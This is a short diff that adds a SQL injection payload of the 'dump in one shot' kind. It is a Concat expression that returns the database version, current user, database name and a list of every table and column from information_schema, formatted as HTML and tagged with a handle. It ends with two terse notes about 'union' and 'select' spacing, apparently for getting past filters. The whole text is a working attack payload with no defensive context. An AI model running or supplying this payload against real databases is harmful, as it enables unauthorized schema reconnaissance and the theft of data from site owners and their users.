@@ -1,0 +1,4 @@
+Concat('<b><i>Alb3a_Tross<br><br><li>',version(),'<li>',user (),'<li>',database (),'<br><br>',(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,'<li>',table_name,' >>> ',column_name))))a))
+
+$ union double space
+$ select double space
